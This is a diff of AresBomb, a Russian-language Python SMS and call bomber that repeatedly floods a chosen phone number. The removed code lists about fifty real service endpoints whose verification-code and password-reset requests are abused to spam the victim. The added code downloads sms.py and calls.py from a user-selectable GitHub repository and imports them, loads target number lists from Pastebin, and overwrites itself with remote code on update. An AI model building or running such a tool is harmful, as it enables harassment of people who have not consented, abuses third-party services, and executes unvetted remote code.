@@ -1,258 +1,300 @@
-import requests
-import random, datetime, sys, time, argparse, os
-from requests import post
+import requests, time
+import random, os, codecs
+from sys import exit
 
-version = 1.052
-set = [1, 10]
+version = 2
+set = [1, 0]
 fav_phones = []
+repo = "MaksPV/AresBomb-databases"
 
-if os.path.isfile("config.data") != 1:
-	with open('config.data', 'w') as filehandle:  
- 	   for listitem in set:
- 	   	filehandle.write('%s\n' % listitem)
+if os.path.isfile("sms.py") and os.path.isfile("calls.py"):
+    from sms import Sms
+    from calls import Calls
+    
+    Smss = Sms()
+    Callss = Calls()
+else:
+    with codecs.open("sms.py", "w", encoding = 'utf8') as f:
+        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/заглушка/sms.py").text)
+    f.close()
+    with codecs.open("calls.py", "w", encoding = 'utf8') as f:
+        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/заглушка/calls.py").text)
+    f.close()
+    print("Запустите еще раз")
+    exit()
 
-if os.path.isfile("config.data") == 1:
-	set = []
-	with open('config.data', 'r') as filehandle:
-	 	for line in filehandle:
-	 		currentPlace = line[:-1]
-	 		set.append(float(currentPlace))
+if os.path.isfile("config.txt") != 1:
+    with open('config.txt', 'w') as filehandle:  
+        for listitem in set:
+            filehandle.write('%s\n' % listitem)
+
+if os.path.isfile("config.txt") == 1:
+    set = []
+    with open('config.txt', 'r') as filehandle:
+         for line in filehandle:
+             currentPlace = line[:-1]
+             set.append(float(currentPlace))
 
 if os.path.isfile("phones.data") != 1:
-	with open('phones.data', 'w') as filehandle:  
- 	   for listitem in fav_phones:
- 	   	filehandle.write('%s\n' % listitem)
+    with open('phones.data', 'w') as filehandle:  
+        for listitem in fav_phones:
+            filehandle.write('%s\n' % listitem)
 
 if os.path.isfile("phones.data") == 1:
-	with open('phones.data', 'r') as filehandle:
-	 	for line in filehandle:
-	 		currentPlace = line[:-1]
-	 		fav_phones.append(currentPlace)
+    with open('phones.data', 'r') as filehandle:
+         for line in filehandle:
+             currentPlace = line[:-1]
+             fav_phones.append(currentPlace)
+
+if os.path.isfile("repo.data") != 1:
+    with open('repo.data', 'w') as filehandle:  
+        filehandle.write("MaksPV/AresBomb-databases")
+
+if os.path.isfile("repo.data") == 1:
+    with open('repo.data', 'r') as filehandle:
+         repo = filehandle.read()
 
 def return_phones():
-	global fav_phones, _phone
-	print(banner)
-	for i in range(int(len(fav_phones)/2)):
-		print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
-	_phone = fav_phones[int(input("\n"))*2]
-	
+    global fav_phones, _phone
+    print(banner)
+    for i in range(int(len(fav_phones)/2)):
+        print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
+    _phone = fav_phones[int(input("\n"))*2]
+    
 def save_phones():
-	global fav_phones
-	while True:
-		print(banner)
-		for i in range(int(len(fav_phones)/2)):
-			print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
-		print("\n1 - Добавить номер\n2 - Удалить номер\n0 - Выйти")
-		_menu = input()
-		if _menu == "0": break
-		if _menu == "1":
-			fav_phones.append(input("Введите номер: "))
-			fav_phones.append(input("Введите метку для номера: "))
-		if _menu == "2":
-	 		delete_phones = int(input("Введите номер номера, который вы хотите удалить: "))
-	 		fav_phones.pop(delete_phones*2)
-	 		fav_phones.pop(delete_phones*2)
-		with open('phones.data', 'w') as filehandle:
-			for listitem in fav_phones:
-				filehandle.write('%s\n' % listitem)
+    global fav_phones
+    while True:
+        print(banner)
+        for i in range(int(len(fav_phones)/2)):
+            print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
+        print("\n1 - Добавить номер\n2 - Удалить номер\n3 - Скачать базу с Pastebin\n0 - Выйти")
+        _menu = input()
+        if _menu == "0": break
+        elif _menu == "1":
+            fav_phones.append(input("Введите номер: "))
+            fav_phones.append(input("Введите метку для номера: "))
+        elif _menu == "2":
+            delete_phones = int(input("Введите номер номера, который вы хотите удалить: "))
+            fav_phones.pop(delete_phones*2)
+            fav_phones.pop(delete_phones*2)
+        elif _menu == "3":
+            print(banner)
+            pastebin_id = input("Введите id записи на pastebin: ")
+            try:
+                pastebin_data = requests.get('https://pastebin.com/raw/' + pastebin_id).text
+                a_menu = input("Вы хотите заменить или добавить текущий список?\n\n0 - Заменить\n1 - добавить\n\n")
+                if a_menu == "0":
+                    fav_phones = pastebin_data.splitlines()
+                    print(fav_phones)
+                elif a_menu == "1":
+                    fav_phones.extend(pastebin_data.splitlines())
+                print("Готово")
+            except:
+                print("Ошибка, такой пасты не существует")
+        with open('phones.data', 'w') as filehandle:
+            for listitem in fav_phones:
+                filehandle.write('%s\n' % listitem)
 
 def update():
-	global version
-	print("Проверка обновлений")
-	try:
-		upd=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/last_version.txt')
-		upd_vers = float(upd.text[0:6])
-		if upd_vers > version:
-			print("Найдено обновление\n" + upd.text[0:6] + "\nИзменения:\n" + upd.text[7:])
-			print("\nНачато обновление")
-			upd_boom=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/boom.py')
-			f = open("boom.py", "wb")
-			f.write(upd_boom.content)
-			f.close()
-			print("\nОбновление завершено, откройте бомбер заново командой\npython AresBomb/boom.py")
-			return "exit"
-		elif upd_vers == version: print("Установлена последняя версия, вы прекрасны")
-		elif upd_vers < version: print("Не хочешь попасть в команду?")
-		else: print("Ошибка, файл обновлений не найден")
-	except BaseException:
-		print("Нет интернета, попробуйте позже")
-
-def send_sms(serv):
-	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
-	if serv == 0: post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-	elif serv == 1: post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-	elif serv == 2: post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-	elif serv == 3: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-	elif serv == 4: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-	elif serv == 5: post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-	elif serv == 6: post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-	elif serv == 7: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-	elif serv == 8: post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
-	elif serv == 9: post('https://www.rabota.ru/remind', data={'credential': _phone})
-	elif serv == 10: post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
-	elif serv == 11: post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
-	elif serv == 12: post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
-	elif serv == 13: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
-	elif serv == 14: requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
-	elif serv == 15: post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
-	elif serv == 16: post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
-	elif serv == 17: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
-	elif serv == 18: post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-	elif serv == 19: post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
-	elif serv == 20: post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
-	elif serv == 21: post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-	elif serv == 22: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
-	elif serv == 23: post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-	elif serv == 24: post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
-	elif serv == 25: post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
-	elif serv == 26: post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
-	elif serv == 27: post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-	elif serv == 28: post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
-	elif serv == 29: post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-	elif serv == 30: post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
-	elif serv == 31: post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
-	elif serv == 32: post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
-	elif serv == 33: post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
-	elif serv == 34: post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
-	elif serv == 35: post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
-	elif serv == 36: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
-	elif serv == 37: post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
-	elif serv == 38: post('https://plink.tech/register/',json={"phone": _phone})
-	elif serv == 39: post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
-	elif serv == 40: post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
-	elif serv == 41: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
-	elif serv == 42: post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
-	elif serv == 43: post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
-	elif serv == 44: post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
-	elif serv == 45: post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
-	elif serv == 46: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-	elif serv == 47: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
-	elif serv == 48: post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
-	elif serv == 49: post('https://b.utair.ru/api/v1/login/', data = {'login': _phone, }, headers = {'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
-	else: print("Ошибка сервиса")
-
-def send_call(serv):
-	global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
-	if serv == 0: requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
-	else: print("Ошибка сервиса")
+    global version
+    print("Проверка обновлений")
+    try:
+        upd=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/last_version.txt')
+        upd_vers = float(upd.text[0:6])
+        if upd_vers > version:
+            print("Найдено обновление\n" + upd.text[0:6] + "\nИзменения:\n" + upd.text[7:])
+            print("\nНачато обновление")
+            upd_boom=requests.get('https://raw.githubusercontent.com/MaksPV/AresBomb/master/boom.py')
+            f = open("boom.py", "wb")
+            f.write(upd_boom.content)
+            f.close()
+            print("\nОбновление завершено, откройте бомбер заново командой\npython AresBomb/boom.py")
+            return "exit"
+        elif upd_vers == version: print("Установлена последняя версия, вы прекрасны")
+        elif upd_vers < version: print("Не хочешь попасть в команду?")
+        else: print("Ошибка, файл обновлений не найден")
+    except BaseException:
+        print("Нет интернета, попробуйте позже")
 
 def bomb():
-	global set, _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
-	_count_finish = 0
-	print(banner)
-	_phone = input('Введите номер для бомбинга (79xxxxxxxxx)\n1 - Выбрать номер из избранного\n')
-	if _phone == "1": return_phones()
-	try:
-		_count = int(input('Количество сообщений: (100 по умолчанию)'))
-	except:
-		_count = 100
-		
-	try:
-		_timer = float(input('Интервал между сообщениями: (0 по умолчанию) '))
-	except:
-		_timer = 0
-		
-	if _phone[0] == '+': _phone = _phone[1:]
-	if _phone[0] == '8': _phone = '7'+_phone[1:]
-	if _phone[0] == '9': _phone = '7'+_phone
-		
-	_name = ''
-	for x in range(12):
-		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		
-	_phone9 = _phone[1:]
-	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
-	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
-	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-		
-	_email = _name+'@gmail.com'
-	email = _name+'@gmail.com'
-	
-	def screen():
-		print(banner)
-		print("\nДля остановки немедленной нажмите Ctrl+Z\n")
-		print('Номер: '+ _phone+ '\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
-	
-	while _count_finish != _count:
-		randsh = random.randint(1,100)
-		if set[1] > randsh:
-			_service_call = random.randint(0,0)
-			try:
-				send_call(_service_call)
-				screen()
-				print("Сервис звонок " + str(_service_call) + " отправлен")
-				_count_finish += 1
-			except:
-				screen()
-				print("!!! Сервис звонок " + str(_service_call) + " не отправлен")
-		else:
-			_service_sms = random.randint(0, 48)
-			try:
-				send_sms(_service_sms)
-				screen()
-				print("Сервис смс " + str(_service_sms) + " отправлен")
-				_count_finish += 1
-			except:
-				screen()
-				print("!!! Сервис смс " + str(_service_sms) + " не отправлен")
-		time.sleep(_timer)
-	print(banner+'\nРезультат:\n\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
-	if set[0] == 1.0: exit()
-	else: input("Бомбинг завершён, нажмите ENTER для выхода в главное меню")
+    global set, _phone
+    _count_finish = 0
+    print(banner)
+    _phone = input('Введите номер для бомбинга (79xxxxxxxxx)\n1 - Выбрать номер из избранного\n')
+    if _phone == "1": return_phones()
+    try:
+        _count = int(input('Количество сообщений: (100 по умолчанию)'))
+    except:
+        _count = 100
+        
+    try:
+        _timer = float(input('Интервал между сообщениями: (0 по умолчанию) '))
+    except:
+        _timer = 0
+        
+    if _phone[0] == '+': _phone = _phone[1:]
+    if _phone[0] == '8': _phone = '7'+_phone[1:]
+    if _phone[0] == '9': _phone = '7'+_phone
+        
+
+    def screen():
+        print(banner)
+        print("Для остановки немедленной нажмите Ctrl+Z\n")
+        print('Номер: '+ _phone+ '\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
+    
+    while _count_finish != _count:
+        randsh = random.randint(1,100)
+        if set[1] > randsh:
+            _service_call = random.randint(0, Callss.all)
+            try:
+                Callss.send(_service_call, _phone)
+                screen()
+                print("Сервис звонок " + str(_service_call) + " отправлен")
+                _count_finish += 1
+            except:
+                screen()
+                print("!!! Сервис звонок " + str(_service_call) + " не отправлен")
+        else:
+            _service_sms = random.randint(0, Sms.all)
+            print(str(_service_sms) + " отправляется")
+            try:
+                Smss.send(_service_sms, _phone)
+                screen()
+                print("Сервис смс " + str(_service_sms) + " отправлен")
+                _count_finish += 1
+            except Exception as ex:
+                print(ex)
+                screen()
+                print("!!! Сервис смс " + str(_service_sms) + " не отправлен")
+        time.sleep(_timer)
+    print(banner+'\nРезультат:\n\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
+    if set[0] == 1.0: exit()
+    else: input("Бомбинг завершён, нажмите ENTER для выхода в главное меню")
 
 def settings():
-	global set
-	while True:
-		print(banner)
-		print("\n1 - Выходить из программы поле бомбинга: " + str(set[0]))
-		print("2 - Вероятность бомбинга звонками: " + str(set[1])+"%")
-		print("\n0 - Выход из этого меню и сохранение")
-		menu = input()
-		if menu == "0":
-			with open('config.data', 'w') as filehandle:  
- 			   for listitem in set:
- 	  		 	filehandle.write('%s\n' % listitem)
-			break
-		elif menu == "1":
-			if set[0] == 1: set[0] = 0
-			elif set[0] == 0: set[0] = 1
-		elif menu == "2":
-			print(banner)
-			set[1] = float(input("\nВведите шанс звонка: "))
+    global set
+    while True:
+        print(banner)
+        print("\n1 - Выходить из программы поле бомбинга: " + str(set[0]))
+        print("2 - Вероятность бомбинга звонками: " + str(set[1])+"%")
+        print("\n0 - Выход из этого меню и сохранение")
+        menu = input()
+        if menu == "0":
+            with open('config.data', 'w') as filehandle:  
+                for listitem in set:
+                    filehandle.write('%s\n' % listitem)
+            break
+        elif menu == "1":
+            if set[0] == 1: set[0] = 0
+            elif set[0] == 0: set[0] = 1
+        elif menu == "2":
+            print(banner)
+            set[1] = float(input("\nВведите шанс звонка: "))
+
+def get_base():
+    global repo
+    while True:
+        print(banner)
+        # print("У вас сейчас\n\nБаза СМС:\n{0}\n\nБаза звонков:\n{1}\n".format(Smss.author, Calls.author))
+        menu = input("1 - Загрузить список доступных баз\n2 - Поменять репозиторий\n\n0 - Выйти\n")
+        if menu == "0": break
+        elif menu == "1":
+            print(banner)
+            
+            a = requests.get("https://raw.githubusercontent.com/" + repo + "/master/all.txt").text.splitlines()
+            b = [[], []]
+            
+            for i in a:
+                b[0].append(i[:-3])
+                b[1].append(i[-2:])
+            
+            print("Список доступных баз:\n\n0 - Выйти\n")
+            for i in range(len(b[0])):
+                print(str(i + 1) + " - " + b[0][i])
+            
+            menu = input()
+            try:
+                menu = int(menu) - 1
+            except:
+                pass
+            if menu == -1: pass
+            else:
+                print(banner)
+                print("Информация:")
+                print(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/description.txt").text)
+                if b[1][menu] == "10":
+                    print("1 - Скачать базу СМС")
+                elif b[1][menu] == "11":
+                    print("1 - Скачать базу СМС\n2 - Скачать базу звонков\n3 - Скачать всё")
+                elif b[1][menu] == "01":
+                    print("2 - Скачать базу звонков")
+                else:
+                    pass
+                print("\n0 - Выйти")
+                menu1 = input()
+                if menu1 == "0":
+                    pass
+                elif menu1 == "1":
+                    with codecs.open("sms.py", "w", encoding = 'utf8') as f:
+                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/sms.py").text)
+                    f.close()
+                    exit()
+                elif menu1 == "2":
+                    with codecs.open("calls.py", "w", encoding = 'utf8') as f:
+                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/calls.py").text)
+                    f.close()
+                    exit()
+                elif menu1 == "3":
+                    with codecs.open("sms.py", "w", encoding = 'utf8') as f:
+                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/sms.py").text)
+                    f.close()
+                    with codecs.open("calls.py", "w", encoding = 'utf8') as f:
+                        f.write(requests.get("https://raw.githubusercontent.com/" + repo + "/master/"+ b[0][menu] +"/calls.py").text)
+                    f.close()
+                    exit()
+                
+        elif menu == "2":
+            print(banner)
+            print("Текущий репозиторий: " + repo)
+            print("\n0 - Выйти")
+            print("Введите ссылку на гитхабе, типа MaksPV/AresBomb-databases")
+            
+            c = input("\n")
+            if c == "0":
+                pass
+            else:    
+                repo = c
+            with open('repo.data', 'w') as filehandle:  
+                filehandle.write(repo)
+            pass
 
 def info():
-	global banner, version
-	print(banner+"\nВерсия "+str(version)+"\n\nБомбер создан только для развлекательных целей. За все действия что вы с ним проводите отвечаете только вы\n\nОригинальный бомбер: https://github.com/FSystem88/spymer\n\nСоздатель данной модификации telete.in/MaksPV\n\nНажмите ENTER чтобы выйти")
-	input()
+    global banner, version
+    print(banner+"\nВерсия "+str(version)+"\n\nБомбер создан только для развлекательных целей. За все действия что вы с ним проводите отвечаете только вы\n\nСоздатель данной модификации t.me/maksimushka\n\nНажмите ENTER чтобы выйти")
+    input()
 
 if update() == "exit": exit()
 time.sleep(1)
 
 while True:
-	banner = ("\n" * 100)+ """
-     _                        
-    / \   _ __ ___  ___       
-   / _ \ | '__/ _ \/ __|      
-  / ___ \| | |  __/\__ \      
- /_/   \_\_|  \___||___/      
-  ____                  _     
- | __ )  ___  _ __ ___ | |__  
- |  _ \ / _ \| '_ ` _ \| '_ \ 
- | |_) | (_) | | | | | | |_) |
- |____/ \___/|_| |_| |_|_.__/ 
+    banner = ("\n" * 100)+ """                   _______   
+                  /\______\  
+                  \/______/                                                       
+    ____________     ___   
+   / ___________\   / __'\ 
+  /\ \________L\ \ /\ \L\ \\
+  \ \____________/ \ \____/
+   \/___________/   \/___/
 
  telegram channel: @AresBomb
 
-!!! Сервисы немного устарели, но некоторые работают !!!                        
-	"""
-	print(banner)
-	menu = input("1 - Начать бомбинг\n2 - Настройки бомбера\n3 - Номера в избранном\n4 - Информация о бомбере\n\n0 - Выход\n")
-	if menu == "0": exit()
-	if menu == "1": bomb()
-	if menu == "2": settings()
-	if menu == "3": save_phones()
-	if menu == "4": info()
+{}
+""".format(Smss.author)
+    print(banner)
+    menu = input("1 - Начать бомбинг\n2 - Настройки бомбера\n3 - Номера в избранном\n4 - Скачать другие базы\n5 - Информация о бомбере\n\n0 - Выход\n")
+    if menu == "0": exit()
+    elif menu == "1": bomb()
+    elif menu == "2": settings()
+    elif menu == "3": save_phones()
+    elif menu == "4": get_base()
+    elif menu == "5": info()
